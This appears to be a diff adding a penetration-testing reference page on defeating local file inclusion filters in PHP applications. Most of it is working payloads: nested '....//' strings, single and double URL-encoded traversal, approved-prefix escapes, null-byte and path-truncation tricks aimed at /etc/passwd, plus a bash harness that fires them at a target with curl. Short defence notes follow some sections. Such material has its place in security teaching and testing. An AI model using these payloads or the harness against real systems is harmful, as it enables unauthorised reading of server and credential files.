@@ -1,0 +1,316 @@
+---
+title: Filter bypasses
+description: Defeating LFI input filters - non-recursive sanitization, URL encoding, approved-path checks, path truncation, and null-byte injection.
+mitre: [T1190, T1027]
+d3fend: [D3-FA]
+impact: [FileRead]
+owasp: [A03]
+sidebar:
+  order: 3
+  label: Filter bypasses
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When `../` is stripped or the path is restricted to an allowed directory, several bypasses defeat the filter:
+
+```
+# Non-recursive ../ strip - use a payload that decomposes to ../ after one pass
+....//....//....//....//etc/passwd
+..././..././..././etc/passwd
+
+# URL-encoding when raw . or / are blocked
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd      # ../../../etc/passwd encoded
+%252e%252e%252f...                            # double-encoded for double-decoding apps
+
+# Approved-path check - start with the approved prefix, then traverse out
+./languages/../../../../etc/passwd
+/var/www/html/uploads/../../../etc/passwd
+
+# Old PHP (≤5.3) only - null-byte injection truncates appended extension
+?page=/etc/passwd%00
+
+# Old PHP (≤5.3) only - path truncation
+?page=non_existent/../../etc/passwd/.................................. (4096+ chars)
+```
+
+Success indicator: file contents in the response despite the filter being in place.
+
+## Non-recursive `../` strip
+
+The most common LFI filter - `str_replace` (or equivalent) removes all `../` substrings from the input:
+
+```php
+$page = str_replace('../', '', $_GET['page']);
+include("./languages/" . $page);
+```
+
+The fix is wrong because `str_replace` runs once. A payload constructed so that *after one pass of stripping `../`*, the remaining string still contains `../`:
+
+```
+input:    ....//....//....//etc/passwd
+strip:    ..  /..  /..  /etc/passwd      ← the inner ../ is removed
+result:   ../../../etc/passwd            ← traversal restored
+```
+
+The same logic applies to several payload variants:
+
+```
+....//etc/passwd                            ← ../ inside `....//`
+..././etc/passwd                            ← ../ inside `..././`
+....\/etc/passwd                            ← escaped slash variant
+....////etc/passwd                          ← extra slashes
+```
+
+The principle: nest the forbidden sequence inside a longer pattern that resolves to the forbidden sequence after one filter pass.
+
+### Worked example
+
+```
+?page=....//....//....//....//etc/passwd
+```
+
+After `str_replace('../', '', ...)`:
+
+```
+....//....//....//....//etc/passwd
+  ↓ first ../ removed (from `....//` = ..  + ../)
+  ↓ but the filter operates substring-by-substring, leaving `../` in each
+../../../../etc/passwd
+```
+
+The exact behavior depends on the filter implementation - some replace all instances in parallel, some iterate. Test the variants and observe the response.
+
+### Defending against this
+
+Recursive sanitization: loop the `str_replace` until the string stops changing:
+
+```php
+while (strpos($page, '../') !== false) {
+    $page = str_replace('../', '', $page);
+}
+```
+
+This catches `....//` because removing the inner `../` leaves `../`, which the next iteration removes. Most production filters do this; the bypass works against the naive single-pass variant.
+
+## URL encoding
+
+Some filters operate on the raw URL parameter before URL-decoding happens. Encoding the traversal characters defeats the string match:
+
+```
+../              →  %2e%2e%2f
+../../           →  %2e%2e%2f%2e%2e%2f
+/etc/passwd      →  %2f%65%74%63%2f%70%61%73%73%77%64
+```
+
+Full encoded path:
+
+```
+?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+The application receives this, the filter sees `%2e%2e%2f...` (no literal `../`), passes the input through, and then PHP's URL-decoding before `include()` restores the `../`. Bug fires.
+
+### Encoding only what's necessary
+
+Some apps URL-decode partially or check only specific characters. Try encoding just the dots:
+
+```
+%2e%2e/../etc/passwd                         # only first dots encoded
+..%2f..%2f..%2fetc/passwd                    # slashes encoded
+```
+
+If the filter is encoded-character-specific, the right encoding-mix will get through.
+
+### Double encoding
+
+When the application URL-decodes twice (sometimes by accident - once at the web server, once at the app framework), double-encoding survives the first decode:
+
+```
+%252e%252e%252f                              # %25 = %, so this decodes to %2e%2e%2f, then to ../
+```
+
+Full payload:
+
+```
+?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+Double-decoding behavior is application-specific - test both single and double encoding when filtering is suspected.
+
+### Defending against this
+
+Decode-then-filter, not filter-then-decode. Modern frameworks do the right thing by default; custom filters often don't.
+
+## Approved-path filters
+
+A more sophisticated filter checks that the input begins with an allowed directory:
+
+```php
+if (preg_match('/^\.\/languages\/.+$/', $_GET['page'])) {
+    include($_GET['page']);
+} else {
+    die('Illegal path specified!');
+}
+```
+
+The check passes the input through unchanged if it starts with `./languages/`. The bypass: start with the approved prefix, then use traversal to escape it:
+
+```
+?page=./languages/../../../../etc/passwd
+```
+
+The regex sees `./languages/` at the start - pass. The filesystem resolves `./languages/../../../../etc/passwd` to `/etc/passwd` - bug fires.
+
+### Finding the approved path
+
+When the application doesn't tell you what the approved path is, infer it:
+
+- Look at normal URLs the app uses - `?page=languages/en.php` tells you the prefix
+- Try common patterns: `./templates/`, `./views/`, `./includes/`, `./pages/`, `./assets/`
+- Brute force via parameter fuzzing - the app's response tells you when the prefix is right
+
+### Combined with other filters
+
+Approved-path checks are often combined with the `../` strip. Stack the bypasses:
+
+```
+?page=./languages/....//....//....//....//etc/passwd
+```
+
+The approved-path check passes (starts with `./languages/`), the `../` strip leaves `../` behind, the filesystem walks out, the file gets read.
+
+## Path truncation (old PHP only)
+
+In PHP versions before 5.3, strings had a max length of 4096 characters. Anything beyond was silently truncated. Combined with PHP's lenient path resolution (collapsing `/./` and trailing `/.`), this allowed bypassing appended extensions:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+The payload:
+
+```
+?page=non_existent/../../../etc/passwd/.[./ repeated until total length > 4096]
+```
+
+After truncation:
+- Concatenated string: `non_existent/../../../etc/passwd/././././...[4096 chars total].php`
+- Truncated at 4096: `...etc/passwd/././.` (the `.php` falls off)
+- PHP collapses `/./` repetitions: `/etc/passwd`
+
+Generate the payload:
+
+```bash
+echo -n "non_existent/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+
+### Why this doesn't work on modern PHP
+
+PHP 5.3+ relaxed the 4096-char limit and changed how `realpath()` handles excessive `/./` sequences. Path truncation is essentially dead against any maintained system; documented here for completeness against legacy targets.
+
+The "non-existent prefix" trick is also no longer required on modern PHP - PHP used to require the path to exist for canonicalization, which the leading non-existent segment satisfied via PHP's lenient resolution. Modern PHP doesn't require this.
+
+## Null-byte injection (very old PHP only)
+
+PHP versions before 5.3.4 treated null bytes (`\0`, `%00` URL-encoded) as string terminators when passed to filesystem functions:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+```
+?page=/etc/passwd%00
+```
+
+The concatenation produces `/etc/passwd\0.php`. PHP's filesystem layer used C-style strings internally and stopped reading at the null byte - the `.php` was discarded, the file loaded was `/etc/passwd`.
+
+### Why this doesn't work anymore
+
+PHP 5.3.4 (released 2010) explicitly rejects null bytes in filenames. Every supported PHP version refuses null-byte payloads. The technique is documented for legacy systems running very old PHP.
+
+## Combining bypasses
+
+Real filters often combine multiple defenses. Combine the bypasses correspondingly:
+
+```
+# str_replace + URL-encoding + approved path
+?page=./languages/....//....//....//....//etc%2fpasswd
+
+# Approved path + double-encoding
+?page=./languages/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+# Recursive strip-resistant + approved path + appended extension
+# → use a wrapper instead - see /codex/web/lfi/wrappers/
+```
+
+When stacking, start with the minimum complexity and add only what's needed. A diff between "what gets through unchanged" and "what gets stripped" tells you what each layer of the filter does.
+
+## Diagnostic - what's the filter doing?
+
+Five probes that map common filter behaviors:
+
+```
+1. ?page=/etc/passwd
+   → If this works, no traversal-blocking filter at all
+
+2. ?page=../etc/passwd
+   → If this works without the `../`, simple replace is happening
+
+3. ?page=....//etc/passwd
+   → If this works, single-pass strip is the filter type
+
+4. ?page=%2e%2e%2fetc/passwd
+   → If this works, raw-character check (decoded earlier in the pipeline)
+
+5. ?page=./languages/../etc/passwd
+   → If this works (or with extra `../`), approved-path check is in use
+```
+
+The combination of which work and which fail identifies the filter precisely.
+
+## Filter-bypass test harness
+
+For systematic testing against an unknown filter:
+
+```bash
+PAYLOADS=(
+    '/etc/passwd'
+    '../etc/passwd'
+    '../../etc/passwd'
+    '../../../../etc/passwd'
+    '../../../../../../etc/passwd'
+    '....//etc/passwd'
+    '....//....//....//etc/passwd'
+    '..././etc/passwd'
+    '..\../etc/passwd'
+    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+    '/etc/passwd%00'
+    '/etc/passwd%00.php'
+    './languages/../../../etc/passwd'
+    './languages/....//....//....//etc/passwd'
+)
+
+for p in "${PAYLOADS[@]}"; do
+    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p', safe=''))")
+    response=$(curl -s "https://target.example.com/?page=$encoded")
+    if echo "$response" | grep -q "root:x:0:0"; then
+        echo "[+] HIT: $p"
+    fi
+done
+```
+
+Adapt the success-check (`grep -q "root:x:0:0"`) to whatever signal works for the target file.
+
+## Notes
+
+- **Filter bypasses degrade gracefully across PHP versions.** The non-recursive strip and URL-encoding bypasses work on all PHP versions. Path truncation only works on PHP ≤5.3. Null-byte only works on PHP ≤5.3.4. When testing, try modern attacks first.
+- **The non-recursive `../` filter is shockingly common.** Many custom filters got written by developers who tested with the obvious `../` payload, observed it being stripped, declared victory, and moved on. The `....//` variant frequently works.
+- **WAFs handle the obvious bypasses.** Commercial WAFs catch `../`, `%2e%2e`, and most `....//`-style payloads in default rulesets. Application-layer filters often don't. The bypass that defeats a WAF and the bypass that defeats an in-app filter are usually different.
+- **Combining traversal with [PHP filters](/codex/web/lfi/php-filters/) is the next step.** Once traversal works, the appended-extension constraint is still in play - use `php://filter/resource=...` to read source code of `.php` files.
+
+<Aside type="tip">
+When a filter blocks everything you've tried but the parameter clearly affects something, try wrappers next. The PHP-wrapper paths (`php://filter`, `data://`, `expect://`, `php://input`) frequently bypass filters that are looking for path-traversal patterns - wrappers don't contain `../` at all.
+</Aside>
